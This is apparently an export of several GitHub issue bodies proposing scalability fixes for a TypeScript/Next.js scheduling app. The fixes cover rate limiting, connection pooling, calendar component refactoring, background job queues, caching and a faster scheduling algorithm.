      points: 100, // requests
      duration: 60, // per minute
      blockDuration: 60, // block for 1 minute
    }));
    
    // AI generation rate limit (expensive)
    this.limiters.set('ai', new RateLimiterRedis({
      storeClient: this.redis,
      keyPrefix: 'rl:ai',
      points: 10, // requests
      duration: 3600, // per hour
      blockDuration: 3600, // block for 1 hour
    }));
    
    // Database query rate limit
    this.limiters.set('db', new RateLimiterRedis({
      storeClient: this.redis,
      keyPrefix: 'rl:db',
      points: 500, // queries
      duration: 60, // per minute
      blockDuration: 60,
    }));
    
    // Authentication attempts
    this.limiters.set('auth', new RateLimiterRedis({
      storeClient: this.redis,
      keyPrefix: 'rl:auth',
      points: 5, // attempts
      duration: 900, // per 15 minutes
      blockDuration: 900,
    }));
  }
  
  async checkLimit(
    type: string, 
    identifier: string,
    points: number = 1
  ): Promise<RateLimitResult> {
    const limiter = this.limiters.get(type);
    if (\!limiter) {
      throw new Error(`Unknown rate limiter type: ${type}`);
    }
    
    try {
      const result = await limiter.consume(identifier, points);
      
      return {
        allowed: true,
        remaining: result.remainingPoints,
        resetAt: new Date(Date.now() + result.msBeforeNext),
      };
    } catch (rejRes) {
      if (rejRes instanceof RateLimiterRes) {
        return {
          allowed: false,
          remaining: rejRes.remainingPoints || 0,
          resetAt: new Date(Date.now() + rejRes.msBeforeNext),
          retryAfter: rejRes.msBeforeNext / 1000,
        };
      }
      throw rejRes;
    }
  }
}
```

### 2. Middleware Implementation
```typescript
// middleware/rate-limit.ts
export function rateLimitMiddleware(
  type: string = 'api',
  options?: RateLimitOptions
) {
  return async (req: NextRequest) => {
    const rateLimiter = RateLimitManager.getInstance();
    
    // Get identifier (user ID or IP)
    const identifier = req.userId || req.ip || 'anonymous';
    
    // Check rate limit
    const result = await rateLimiter.checkLimit(
      type,
      identifier,
      options?.cost || 1
    );
    
    // Set headers
    const headers = new Headers();
    headers.set('X-RateLimit-Limit', options?.limit || '100');
    headers.set('X-RateLimit-Remaining', result.remaining.toString());
    headers.set('X-RateLimit-Reset', result.resetAt.toISOString());
    
    if (\!result.allowed) {
      headers.set('Retry-After', result.retryAfter?.toString() || '60');
      
      return NextResponse.json(
        {
          error: 'Rate limit exceeded',
          message: `Too many requests. Please retry after ${result.retryAfter} seconds`,
          retryAfter: result.retryAfter,
        },
        {
          status: 429,
          headers,
        }
      );
    }
    
    return NextResponse.next({ headers });
  };
}
```

### 3. Usage-Based Quotas
```typescript
// lib/quotas/usage-tracker.ts
class UsageTracker {
  async trackUsage(
    userId: string,
    resource: string,
    amount: number = 1
  ): Promise<UsageResult> {
    const quota = await this.getUserQuota(userId, resource);
    const usage = await this.getCurrentUsage(userId, resource);
    
    if (usage + amount > quota.limit) {
      return {
        allowed: false,
        currentUsage: usage,
        limit: quota.limit,
        resetAt: quota.resetAt,
      };
    }
    
    // Record usage
    await this.recordUsage(userId, resource, amount);
    
    return {
      allowed: true,
      currentUsage: usage + amount,
      limit: quota.limit,
      remaining: quota.limit - (usage + amount),
    };
  }
  
  private async getUserQuota(userId: string, resource: string): Promise<Quota> {
    const user = await getUserById(userId);
    const plan = user.subscriptionPlan;
    
    const quotas = {
      free: {
        'ai.generation': { limit: 10, period: 'monthly' },
        'storage.files': { limit: 100, period: 'total' },
        'api.requests': { limit: 1000, period: 'daily' },
      },
      pro: {
        'ai.generation': { limit: 100, period: 'monthly' },
        'storage.files': { limit: 1000, period: 'total' },
        'api.requests': { limit: 10000, period: 'daily' },
      },
      enterprise: {
        'ai.generation': { limit: -1, period: 'unlimited' },
        'storage.files': { limit: -1, period: 'unlimited' },
        'api.requests': { limit: -1, period: 'unlimited' },
      },
    };
    
    return quotas[plan][resource];
  }
}
```

### 4. DDoS Protection
```typescript
// middleware/ddos-protection.ts
class DDoSProtection {
  private ipTracker = new Map<string, {
    requests: number;
    firstRequest: number;
    blocked: boolean;
  }>();
  
  async checkRequest(ip: string): Promise<boolean> {
    const now = Date.now();
    const tracker = this.ipTracker.get(ip);
    
    if (\!tracker) {
      this.ipTracker.set(ip, {
        requests: 1,
        firstRequest: now,
        blocked: false,
      });
      return true;
    }
    
    // Check if blocked
    if (tracker.blocked) {
      return false;
    }
    
    // Reset counter after window
    if (now - tracker.firstRequest > 60000) {
      tracker.requests = 1;
      tracker.firstRequest = now;
    } else {
      tracker.requests++;
    }
    
    // Block if too many requests
    if (tracker.requests > 1000) {
      tracker.blocked = true;
      
      // Auto-unblock after 1 hour
      setTimeout(() => {
        const t = this.ipTracker.get(ip);
        if (t) t.blocked = false;
      }, 3600000);
      
      // Log potential attack
      logger.warn('Potential DDoS from IP', {
        ip,
        requests: tracker.requests,
      });
      
      return false;
    }
    
    return true;
  }
}
```

### 5. Cost-Based Rate Limiting
```typescript
// lib/rate-limiting/cost-based.ts
class CostBasedRateLimiter {
  private costs = {
    // API endpoints with their cost
    'GET /api/students': 1,
    'POST /api/students': 5,
    'POST /api/ai/generate': 50,
    'GET /api/reports/generate': 20,
    'POST /api/schedule/bulk': 30,
  };
  
  async checkRequest(
    endpoint: string,
    userId: string
  ): Promise<RateLimitResult> {
    const cost = this.costs[endpoint] || 1;
    const budget = await this.getUserBudget(userId);
    
    if (budget.remaining < cost) {
      return {
        allowed: false,
        reason: 'Insufficient budget',
        remaining: budget.remaining,
        cost,
        resetAt: budget.resetAt,
      };
    }
    
    // Deduct from budget
    await this.deductBudget(userId, cost);
    
    return {
      allowed: true,
      remaining: budget.remaining - cost,
      cost,
    };
  }
  
  private async getUserBudget(userId: string): Promise<Budget> {
    const key = `budget:${userId}`;
    const budget = await redis.get(key);
    
    if (\!budget) {
      // Initialize budget for the day
      const initialBudget = await this.getInitialBudget(userId);
      await redis.setex(key, 86400, initialBudget);
      return { remaining: initialBudget, resetAt: tomorrow() };
    }
    
    return JSON.parse(budget);
  }
}
```

**Impact**: Database connections exhausted at ~200 concurrent users

## Problem Description
The application creates new database connections for each request without proper pooling:

1. **No connection pooling** configured for Supabase client
2. **Connections not reused** between requests
3. **No connection limits** enforced
4. **Connections leak** on errors
5. **No monitoring** of connection usage

## Current Connection Issues
- Database max connections (100) exhausted quickly
- ""Too many connections"" errors at 200+ users
- 5-10 second delays establishing new connections
- Orphaned connections from crashed processes
- No visibility into connection pool health

## Required Implementation

### 1. Supabase Connection Pool Configuration
```typescript
// lib/supabase/connection-pool.ts
import { createClient } from '@supabase/supabase-js';
import { Pool } from 'pg';

class SupabaseConnectionPool {
  private pool: Pool;
  private supabaseClient: SupabaseClient;
  
  constructor() {
    // Configure connection pool
    this.pool = new Pool({
      connectionString: process.env.DATABASE_URL,
      max: 20, // Maximum connections in pool
      min: 5,  // Minimum connections to maintain
      idleTimeoutMillis: 30000, // Close idle connections after 30s
      connectionTimeoutMillis: 2000, // Timeout for new connections
      maxUses: 7500, // Close connection after 7500 uses
      
      // Health check
      allowExitOnIdle: false,
      
      // Error handling
      error: (err, client) => {
        console.error('Unexpected error on idle client', err);
        this.handleConnectionError(client);
      },
    });
    
    // Monitor pool health
    this.setupPoolMonitoring();
  }
  
  private setupPoolMonitoring() {
    setInterval(() => {
      const stats = {
        total: this.pool.totalCount,
        idle: this.pool.idleCount,
        waiting: this.pool.waitingCount,
      };
      
      // Log metrics
      logger.info('Connection pool stats', stats);
      
      // Alert if pool is exhausted
      if (stats.waiting > 5) {
        logger.warn('Connection pool has waiting requests', stats);
      }
    }, 10000);
  }
  
  async query<T>(text: string, params?: any[]): Promise<T> {
    const client = await this.pool.connect();
    
    try {
      const result = await client.query(text, params);
      return result.rows as T;
    } finally {
      client.release();
    }
  }
  
  async transaction<T>(callback: (client: PoolClient) => Promise<T>): Promise<T> {
    const client = await this.pool.connect();
    
    try {
      await client.query('BEGIN');
      const result = await callback(client);
      await client.query('COMMIT');
      return result;
    } catch (error) {
      await client.query('ROLLBACK');
      throw error;
    } finally {
      client.release();
    }
  }
  
  async end() {
    await this.pool.end();
  }
}
```

### 2. Singleton Pattern for Client Management
```typescript
// lib/supabase/client-manager.ts
class SupabaseClientManager {
  private static instance: SupabaseClientManager;
  private clients: Map<string, SupabaseClient> = new Map();
  private connectionPool: SupabaseConnectionPool;
  
  private constructor() {
    this.connectionPool = new SupabaseConnectionPool();
  }
  
  static getInstance(): SupabaseClientManager {
    if (\!this.instance) {
      this.instance = new SupabaseClientManager();
    }
    return this.instance;
  }
  
  getClient(options?: ClientOptions): SupabaseClient {
    const key = this.getClientKey(options);
    
    if (\!this.clients.has(key)) {
      const client = this.createClient(options);
      this.clients.set(key, client);
    }
    
    return this.clients.get(key)\!;
  }
  
  private createClient(options?: ClientOptions): SupabaseClient {
    return createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL\!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY\!,
      {
        auth: {
          persistSession: false,
        },
        db: {
          schema: 'public',
        },
        global: {
          fetch: this.customFetch.bind(this),
        },
        ...options,
      }
    );
  }
  
  private async customFetch(url: string, options?: RequestInit) {
    // Add connection pooling logic
    return fetch(url, {
      ...options,
      signal: AbortSignal.timeout(5000), // 5 second timeout
    });
  }
}
```

### 3. Request-Scoped Connection Management
```typescript
// middleware/connection-middleware.ts
export async function connectionMiddleware(
  req: NextRequest,
  res: NextResponse
) {
  const connectionManager = SupabaseClientManager.getInstance();
  
  // Attach client to request
  req.supabase = connectionManager.getClient({
    auth: {
      session: req.session,
    },
  });
  
  // Clean up on response
  res.on('finish', () => {
    // Return connection to pool
    connectionManager.releaseClient(req.supabase);
  });
  
  return res;
}
```

### 4. Connection Pool for Edge Functions
```typescript
// lib/supabase/edge-pool.ts
import { createClient } from '@supabase/supabase-js';

const connectionCache = new Map<string, {
  client: SupabaseClient;
  lastUsed: number;
}>();

// Clean up old connections
setInterval(() => {
  const now = Date.now();
  const maxAge = 60000; // 1 minute
  
  for (const [key, value] of connectionCache.entries()) {
    if (now - value.lastUsed > maxAge) {
      connectionCache.delete(key);
    }
  }
}, 30000);

export function getEdgeClient(token?: string): SupabaseClient {
  const key = token || 'anonymous';
  
  if (connectionCache.has(key)) {
    const cached = connectionCache.get(key)\!;
    cached.lastUsed = Date.now();
    return cached.client;
  }
  
  const client = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL\!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY\!,
    {
      auth: {
        persistSession: false,
      },
      global: {
        headers: token ? {
          Authorization: `Bearer ${token}`,
        } : {},
      },
    }
  );
  
  connectionCache.set(key, {
    client,
    lastUsed: Date.now(),
  });
  
  return client;
}
```

### 5. Connection Health Checks
```typescript
// lib/monitoring/connection-health.ts
class ConnectionHealthMonitor {
  private metrics = {
    activeConnections: 0,
    idleConnections: 0,
    waitingRequests: 0,
    connectionErrors: 0,
    averageWaitTime: 0,
  };
  
  async checkHealth(): Promise<HealthStatus> {
    const pool = SupabaseClientManager.getInstance().getPool();
    
    this.metrics = {
      activeConnections: pool.totalCount - pool.idleCount,
      idleConnections: pool.idleCount,
      waitingRequests: pool.waitingCount,
      connectionErrors: pool.errorCount,
      averageWaitTime: pool.averageWaitTime,
    };
    
    // Determine health status
    if (this.metrics.waitingRequests > 10) {
      return {
        status: 'critical',
        message: 'Connection pool exhausted',
        metrics: this.metrics,
      };
    }
    
    if (this.metrics.connectionErrors > 5) {
      return {
        status: 'degraded',
        message: 'High connection error rate',
        metrics: this.metrics,
      };
    }
    
    return {
      status: 'healthy',
      message: 'Connection pool operating normally',
      metrics: this.metrics,
    };
  }
  
  startMonitoring() {
    setInterval(async () => {
      const health = await this.checkHealth();
      
      if (health.status \!== 'healthy') {
        // Send alert
        await sendAlert({
          severity: health.status,
          message: health.message,
          metrics: health.metrics,
        });
      }
      
      // Log metrics

oraios/serena,3361450823,562,[SCALABILITY] React Component Optimization - 1400+ Line Calendar Component,closed,2025-08-28T01:51:24Z,2025-08-28T08:20:10Z,[],bstewart2255,"## 🚨 Priority: HIGH
**Impact**: Calendar becomes unusable with >30 sessions displayed

## Problem Description
The calendar component is a 1400+ line monolith with severe performance issues:

1. **Single massive component** handling all calendar logic
2. **20+ useState hooks** causing excessive re-renders
3. **No memoization** of expensive calculations
4. **Inline functions** recreated on every render
5. **No virtualization** for large session lists

## Current Performance Issues
- 500ms+ render time with 50 sessions
- 2-3 second lag when dragging sessions
- Memory usage grows to 500MB+ after 1 hour
- React DevTools shows 100+ re-renders per interaction

## Files Affected
- `/app/components/calendar/calendar-week-view.tsx` - 1421 lines
- `/app/components/calendar/calendar-month-view.tsx` - 800+ lines
- `/app/components/calendar/calendar-event-modal.tsx` - Complex state management

## Required Refactoring

### 1. Component Decomposition
Break the monolithic component into focused sub-components:

```typescript
// BEFORE: Everything in one component
export function CalendarWeekView() {
  // 20+ useState hooks
  // 10+ useEffect hooks
  // 1400+ lines of mixed logic
}

// AFTER: Separated concerns
// components/calendar/CalendarWeekView.tsx (Container - 200 lines)
export function CalendarWeekView() {
  const { sessions, updateSession } = useCalendarData();
  
  return (
    <CalendarProvider value={{ sessions, updateSession }}>
      <CalendarHeader />
      <CalendarGrid />
      <CalendarSidebar />
    </CalendarProvider>
  );
}

// components/calendar/CalendarGrid.tsx (Grid layout - 150 lines)
export const CalendarGrid = memo(() => {
  const { sessions } = useCalendarContext();
  const days = useWeekDays();
  
  return (
    <div className=""grid grid-cols-7"">
      {days.map(day => (
        <CalendarDay key={day} day={day} />
      ))}
    </div>
  );
});

// components/calendar/CalendarDay.tsx (Day column - 100 lines)
export const CalendarDay = memo(({ day }: { day: Date }) => {
  const sessions = useSessionsForDay(day);
  
  return (
    <div className=""calendar-day"">
      <DayHeader date={day} />
      <TimeSlots>
        {sessions.map(session => (
          <SessionBlock key={session.id} session={session} />
        ))}
      </TimeSlots>
    </div>
  );
});

// components/calendar/SessionBlock.tsx (Individual session - 80 lines)
export const SessionBlock = memo(({ session }: { session: Session }) => {
  const { isDragging, dragProps } = useDraggable(session);
  
  return (
    <div className=""session-block"" {...dragProps}>
      <SessionContent session={session} />
      {session.hasConflict && <ConflictIndicator />}
    </div>
  );
});
```

### 2. State Management Optimization
```typescript
// BEFORE: Everything in component state
function CalendarWeekView() {
  const [sessions, setSessions] = useState([]);
  const [selectedSession, setSelectedSession] = useState(null);
  const [conflicts, setConflicts] = useState({});
  const [draggedSession, setDraggedSession] = useState(null);
  // ... 20 more useState calls
}

// AFTER: Context + Reducer pattern
const calendarReducer = (state: CalendarState, action: CalendarAction) => {
  switch (action.type) {
    case 'SET_SESSIONS':
      return { ...state, sessions: action.payload };
    case 'UPDATE_SESSION':
      return {
        ...state,
        sessions: state.sessions.map(s =>
          s.id === action.payload.id ? action.payload : s
        ),
      };
    case 'SET_CONFLICTS':
      return { ...state, conflicts: action.payload };
    default:
      return state;
  }
};

export function CalendarProvider({ children }: { children: ReactNode }) {
  const [state, dispatch] = useReducer(calendarReducer, initialState);
  
  const value = useMemo(
    () => ({ state, dispatch }),
    [state]
  );
  
  return (
    <CalendarContext.Provider value={value}>
      {children}
    </CalendarContext.Provider>
  );
}
```

### 3. Memoization and Performance
```typescript
// BEFORE: Recalculating on every render
const getSessionsForTimeSlot = (time: string, day: number) => {
  return sessions.filter(s => 
    s.day === day && s.time === time
  );
};

// AFTER: Memoized calculations
const sessionsByTimeSlot = useMemo(() => {
  const map = new Map<string, Session[]>();
  
  sessions.forEach(session => {
    const key = `${session.day}-${session.time}`;
    if (\!map.has(key)) {
      map.set(key, []);
    }
    map.get(key)\!.push(session);
  });
  
  return map;
}, [sessions]);

const getSessionsForTimeSlot = useCallback((time: string, day: number) => {
  const key = `${day}-${time}`;
  return sessionsByTimeSlot.get(key) || [];
}, [sessionsByTimeSlot]);
```

### 4. Virtual Scrolling for Large Lists
```typescript
// Use react-window for virtualizing long session lists
import { FixedSizeList } from 'react-window';

export function SessionList({ sessions }: { sessions: Session[] }) {
  const Row = ({ index, style }: { index: number; style: CSSProperties }) => (
    <div style={style}>
      <SessionBlock session={sessions[index]} />
    </div>
  );
  
  return (
    <FixedSizeList
      height={600}
      itemCount={sessions.length}
      itemSize={80}
      width=""100%""
    >
      {Row}
    </FixedSizeList>
  );
}
```

### 5. Custom Hooks for Logic Extraction
```typescript
// hooks/useCalendarDragDrop.ts
export function useCalendarDragDrop() {
  const [draggedItem, setDraggedItem] = useState<Session | null>(null);
  const [dropTarget, setDropTarget] = useState<TimeSlot | null>(null);
  
  const handleDragStart = useCallback((session: Session) => {
    setDraggedItem(session);
  }, []);
  
  const handleDragOver = useCallback((slot: TimeSlot) => {
    setDropTarget(slot);
  }, []);
  
  const handleDrop = useCallback(async () => {
    if (\!draggedItem || \!dropTarget) return;
    
    // Validate and update
    await updateSessionTime(draggedItem.id, dropTarget);
    
    setDraggedItem(null);
    setDropTarget(null);
  }, [draggedItem, dropTarget]);
  
  return {
    draggedItem,
    dropTarget,
    handleDragStart,
    handleDragOver,
    handleDrop,
  };
}

// hooks/useSessionConflicts.ts  
export function useSessionConflicts(sessions: Session[]) {
  return useMemo(() => {
    const conflicts = new Map<string, boolean>();
    
    // Efficient O(n log n) conflict detection
    const sorted = [...sessions].sort((a, b) => 
      a.startTime - b.startTime
    );
    
    for (let i = 0; i < sorted.length - 1; i++) {
      if (sorted[i].endTime > sorted[i + 1].startTime) {
        conflicts.set(sorted[i].id, true);
        conflicts.set(sorted[i + 1].id, true);
      }
    }
    
    return conflicts;
  }, [sessions]);
}
```

oraios/serena,3361446145,561,[SCALABILITY] Background Job Processing System for Heavy Operations,closed,2025-08-28T01:48:51Z,2025-08-28T08:20:25Z,[],bstewart2255,"## 🚨 Priority: HIGH
**Impact**: UI freezes during AI generation and bulk scheduling operations

## Problem Description
Heavy operations run synchronously, blocking the UI and causing timeouts:

1. **AI lesson generation** blocks for 5-30 seconds
2. **Bulk scheduling** freezes UI for entire operation
3. **Report generation** times out on large datasets
4. **No retry mechanism** for failed operations
5. **No progress tracking** for long-running tasks

## Current User Experience Issues
- Page unresponsive during AI generation
- Scheduling 50+ students causes browser freeze
- Lost work when operations timeout
- No visibility into operation progress
- Failed operations require manual restart

## Required Architecture

### 1. Job Queue Implementation (BullMQ/Redis)
```typescript
// lib/queue/job-queue.ts
import { Queue, Worker, Job } from 'bullmq';

class JobQueue {
  private queues: Map<string, Queue> = new Map();
  private workers: Map<string, Worker> = new Map();
  
  createQueue(name: string, processor: (job: Job) => Promise<any>) {
    // Create queue
    const queue = new Queue(name, {
      connection: redisConnection,
      defaultJobOptions: {
        removeOnComplete: 100,
        removeOnFail: 1000,
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 2000,
        },
      },
    });
    
    // Create worker
    const worker = new Worker(name, processor, {
      connection: redisConnection,
      concurrency: 5,
    });
    
    this.queues.set(name, queue);
    this.workers.set(name, worker);
    
    return queue;
  }
  
  async addJob(queueName: string, data: any, options?: JobOptions) {
    const queue = this.queues.get(queueName);
    if (!queue) throw new Error(`Queue ${queueName} not found`);
    
    return await queue.add('process', data, options);
  }
}
```

### 2. AI Generation Queue
```typescript
// lib/queue/processors/ai-lesson-processor.ts
export async function processAILessonGeneration(job: Job) {
  const { request, userId } = job.data;
  
  try {
    // Update progress
    await job.updateProgress(10);
    
    // Generate lesson
    const lesson = await lessonGenerator.generate(request);
    await job.updateProgress(70);
    
    // Save to database
    const saved = await saveLesson(lesson, userId);
    await job.updateProgress(90);
    
    // Send notification
    await notifyUser(userId, {
      type: 'lesson-ready',
      lessonId: saved.id,
    });
    
    await job.updateProgress(100);
    return { lessonId: saved.id };
    
  } catch (error) {
    // Log error with context
    logger.error('AI generation failed', {
      jobId: job.id,
      attempt: job.attemptsMade,
      error: error.message,
      userId,
    });
    
    throw error; // Will trigger retry
  }
}

// Register processor
jobQueue.createQueue('ai-lessons', processAILessonGeneration);
```

### 3. Bulk Scheduling Queue
```typescript
// lib/queue/processors/scheduling-processor.ts
export async function processBulkScheduling(job: Job) {
  const { students, constraints, userId } = job.data;
  const results = [];
  
  for (let i = 0; i < students.length; i++) {
    const student = students[i];
    
    // Update progress
    const progress = Math.floor((i / students.length) * 100);
    await job.updateProgress(progress);
    
    try {
      // Schedule individual student
      const result = await schedulingEngine.scheduleStudent(
        student,
        constraints
      );
      
      results.push(result);
      
      // Send incremental update
      await sendProgressUpdate(userId, {
        completed: i + 1,
        total: students.length,
        currentStudent: student.name,
      });
      
    } catch (error) {
      results.push({
        studentId: student.id,
        error: error.message,
      });
    }
  }
  
  // Send completion notification
  await notifyUser(userId, {
    type: 'scheduling-complete',
    results,
  });
  
  return results;
}
```

### 4. WebSocket Progress Updates
```typescript
// lib/websocket/progress-manager.ts
class ProgressManager {
  private connections: Map<string, WebSocket> = new Map();
  
  async trackJob(userId: string, jobId: string) {
    const job = await getJob(jobId);
    
    // Listen for progress updates
    job.on('progress', (progress) => {
      this.sendUpdate(userId, {
        jobId,
        progress,
        status: 'processing',
      });
    });
    
    job.on('completed', (result) => {
      this.sendUpdate(userId, {
        jobId,
        status: 'completed',
        result,
      });
    });
    
    job.on('failed', (error) => {
      this.sendUpdate(userId, {
        jobId,
        status: 'failed',
        error: error.message,
      });
    });
  }
  
  private sendUpdate(userId: string, data: any) {
    const ws = this.connections.get(userId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(data));
    }
  }
}
```

### 5. React Hook for Job Tracking
```typescript
// hooks/useBackgroundJob.ts
export function useBackgroundJob() {
  const [jobs, setJobs] = useState<Map<string, JobStatus>>(new Map());
  const wsRef = useRef<WebSocket>();
  
  const startJob = async (type: string, data: any) => {
    const response = await fetch('/api/jobs/start', {
      method: 'POST',
      body: JSON.stringify({ type, data }),
    });
    
    const { jobId } = await response.json();
    
    // Initialize job status
    setJobs(prev => new Map(prev).set(jobId, {
      id: jobId,
      status: 'queued',
      progress: 0,
    }));
    
    // Connect WebSocket for updates
    connectWebSocket(jobId);
    
    return jobId;
  };
  
  const connectWebSocket = (jobId: string) => {
    wsRef.current = new WebSocket(`ws://localhost:3000/jobs/${jobId}`);
    
    wsRef.current.onmessage = (event) => {
      const update = JSON.parse(event.data);
      
      setJobs(prev => {
        const newJobs = new Map(prev);
        newJobs.set(jobId, update);
        return newJobs;
      });
    };
  };
  
  return { startJob, jobs };
}
```

### 6. UI Progress Component
```typescript
// components/JobProgress.tsx
export function JobProgress({ jobId }: { jobId: string }) {
  const { jobs } = useBackgroundJob();
  const job = jobs.get(jobId);
  
  if (!job) return null;
  
  return (
    <div className=""job-progress"">
      <h3>Processing...</h3>
      <ProgressBar value={job.progress} max={100} />
      <p>{job.status}</p>
      {job.error && (
        <Alert type=""error"">{job.error}</Alert>
      )}
    </div>
  );
}
```

**Impact**: Every request hits the database, causing 10x more load than necessary

## Problem Description
The application has no caching layer, resulting in:

1. **Repeated database queries** for unchanged data
2. **No CDN** for static assets and API responses
3. **Session data fetched on every request**
4. **AI responses not cached** despite being expensive
5. **No browser caching headers** configured

## Current Performance Impact
- Same query executed 100+ times per minute
- Database CPU at 80% with just 50 users
- API response times 500ms+ for cached-eligible data
- AI generation costs 00+/day due to repeated requests

## Required Caching Layers

### 1. Redis Cache Implementation
```typescript
// lib/cache/redis-client.ts
import { createClient } from 'redis';

class CacheManager {
  private client: RedisClient;
  private defaultTTL = 3600; // 1 hour
  
  async get<T>(key: string): Promise<T | null> {
    const cached = await this.client.get(key);
    return cached ? JSON.parse(cached) : null;
  }
  
  async set<T>(key: string, value: T, ttl?: number): Promise<void> {
    await this.client.setex(
      key, 
      ttl || this.defaultTTL,
      JSON.stringify(value)
    );
  }
  
  async invalidate(pattern: string): Promise<void> {
    const keys = await this.client.keys(pattern);
    if (keys.length) {
      await this.client.del(...keys);
    }
  }
}
```

### 2. Query Result Caching
```typescript
// lib/supabase/cached-queries.ts
class CachedQuery {
  async getStudents(providerId: string): Promise<Student[]> {
    const cacheKey = `students:${providerId}`;
    
    // Check cache first
    const cached = await cache.get<Student[]>(cacheKey);
    if (cached) return cached;
    
    // Fetch from database
    const students = await fetchStudentsFromDB(providerId);
    
    // Cache for 15 minutes
    await cache.set(cacheKey, students, 900);
    
    return students;
  }
  
  // Invalidate on update
  async updateStudent(studentId: string, data: Partial<Student>) {
    await updateStudentInDB(studentId, data);
    
    // Invalidate related caches
    await cache.invalidate(`students:*`);
    await cache.invalidate(`student:${studentId}:*`);
  }
}
```

### 3. API Response Caching
```typescript
// middleware/api-cache.ts
export function apiCache(ttl: number = 300) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const cacheKey = `api:${req.method}:${req.url}`;
    
    // Check cache for GET requests
    if (req.method === 'GET') {
      const cached = await cache.get(cacheKey);
      if (cached) {
        res.setHeader('X-Cache', 'HIT');
        return res.json(cached);
      }
    }
    
    // Store original send
    const originalSend = res.json;
    
    // Override send to cache response
    res.json = function(data: any) {
      res.setHeader('X-Cache', 'MISS');
      
      // Cache successful responses
      if (res.statusCode === 200) {
        cache.set(cacheKey, data, ttl);
      }
      
      return originalSend.call(this, data);
    };
    
    next();
  };
}
```

### 4. CDN Configuration
```typescript
// next.config.js updates
module.exports = {
  images: {
    domains: ['cdn.yourdomain.com'],
  },
  
  async headers() {
    return [
      {
        source: '/api/static/:path*',
        headers: [
          {
            key: 'Cache-Control',
            value: 'public, max-age=31536000, immutable',
          },
        ],
      },
      {
        source: '/api/data/:path*',
        headers: [
          {
            key: 'Cache-Control',
            value: 'public, max-age=300, stale-while-revalidate=600',
          },
        ],
      },
    ];
  },
};
```

### 5. Session Store with Redis
```typescript
// lib/session/redis-session-store.ts
class RedisSessionStore {
  async get(sessionId: string): Promise<Session | null> {
    return await cache.get(`session:${sessionId}`);
  }
  
  async set(sessionId: string, session: Session): Promise<void> {
    // Sessions expire after 24 hours
    await cache.set(`session:${sessionId}`, session, 86400);
  }
  
  async destroy(sessionId: string): Promise<void> {
    await cache.invalidate(`session:${sessionId}`);
  }
}
```

## Cache Invalidation Strategy

### Pattern-based Invalidation
```typescript
class CacheInvalidator {
  private invalidationRules = {
    'students.update': ['students:*', 'sessions:*'],
    'sessions.create': ['sessions:*', 'calendar:*'],
    'lessons.generate': ['lessons:recent:*'],
  };
  
  async invalidate(event: string, context: any) {
    const patterns = this.invalidationRules[event] || [];
    
    for (const pattern of patterns) {
      await cache.invalidate(pattern);
    }
  }
}
```

oraios/serena,3361439819,559,[SCALABILITY] Algorithm Complexity - O(n\!) Scheduling Engine Performance,closed,2025-08-28T01:45:33Z,2025-08-28T08:19:36Z,[],bstewart2255,"## 🚨 Priority: HIGH
**Impact**: Scheduling operations timeout with >50 students

## Problem Description
The scheduling engine uses exponentially complex algorithms that become unusable with realistic data volumes:

1. **O(n\!) combination generation** for slot selection
2. **Recursive algorithms** without memoization
3. **No early termination** in optimization loops
4. **Brute force conflict checking** instead of indexed lookups

## Current Performance Issues
- Scheduling 20 students: ~2 seconds
- Scheduling 50 students: ~45 seconds
- Scheduling 100+ students: Timeout/crash
- Memory usage spikes to 2GB+ during scheduling

## Files Affected
- `/lib/scheduling/scheduling-engine.ts:279-315` - Exponential combination generation
- `/lib/scheduling/constraint-validator.ts` - Brute force validation
- `/lib/scheduling/session-distributor.ts` - Inefficient distribution algorithms
- `/lib/scheduling/optimization/schedule-optimizer.ts` - No early termination

## Required Algorithm Improvements

### 1. Replace Recursive Combination with Iterative Approach
```typescript
// BEFORE - O(n\!) recursive generation
private generateSlotCombinations(slots: TimeSlot[], needed: number): TimeSlot[][] {
  const combinations: TimeSlot[][] = [];
  
  const generate = (current: TimeSlot[], remaining: TimeSlot[], needed: number) => {
    if (needed === 0) {
      combinations.push([...current]);
      return;
    }
    
    for (let i = 0; i < remaining.length; i++) {
      generate(
        [...current, remaining[i]], 
        remaining.slice(i + 1), 
        needed - 1
      );
    }
  };
  
  generate([], slots, needed);
  return combinations;
}

// AFTER - O(n*k) greedy selection with scoring
private selectOptimalSlots(slots: TimeSlot[], needed: number): TimeSlot[] {
  // Score each slot based on multiple criteria
  const scoredSlots = slots.map(slot => ({
    slot,
    score: this.calculateSlotScore(slot)
  }));
  
  // Sort by score and select top N
  scoredSlots.sort((a, b) => b.score - a.score);
  
  // Use greedy selection with conflict avoidance
  const selected: TimeSlot[] = [];
  for (const { slot } of scoredSlots) {
    if (selected.length >= needed) break;
    
    if (\!this.conflictsWithSelected(slot, selected)) {
      selected.push(slot);
    }
  }
  
  return selected;
}
```

### 2. Implement Indexed Conflict Detection
```typescript
// BEFORE - O(n²) conflict checking
private hasConflict(session1: Session, session2: Session): boolean {
  return session1.day === session2.day &&
         session1.startTime < session2.endTime &&
         session1.endTime > session2.startTime;
}

// AFTER - O(1) with pre-built index
class ConflictIndex {
  private timeIndex: Map<string, Set<string>>; // day-time -> session IDs
  
  addSession(session: Session) {
    const key = `${session.day}-${session.timeSlot}`;
    if (\!this.timeIndex.has(key)) {
      this.timeIndex.set(key, new Set());
    }
    this.timeIndex.get(key)\!.add(session.id);
  }
  
  hasConflict(session: Session): boolean {
    const key = `${session.day}-${session.timeSlot}`;
    return this.timeIndex.has(key) && this.timeIndex.get(key)\!.size > 0;
  }
}
```

### 3. Add Constraint Propagation
```typescript
class ConstraintPropagator {
  // Use constraint propagation to eliminate invalid options early
  propagate(constraints: Constraint[], domain: TimeSlot[]): TimeSlot[] {
    let changed = true;
    
    while (changed) {
      changed = false;
      const sizeBefore = domain.length;
      
      // Apply each constraint
      for (const constraint of constraints) {
        domain = domain.filter(slot => constraint.isSatisfied(slot));
      }
      
      if (domain.length < sizeBefore) {
        changed = true;
      }
    }
    
    return domain;
  }
}
```

### 4. Implement Branch and Bound Optimization
```typescript
class BranchAndBoundScheduler {
  private bestScore = -Infinity;
  private bestSolution: Schedule | null = null;
  
  schedule(students: Student[], slots: TimeSlot[]): Schedule {
    this.search([], students, slots, 0);
    return this.bestSolution\!;
  }
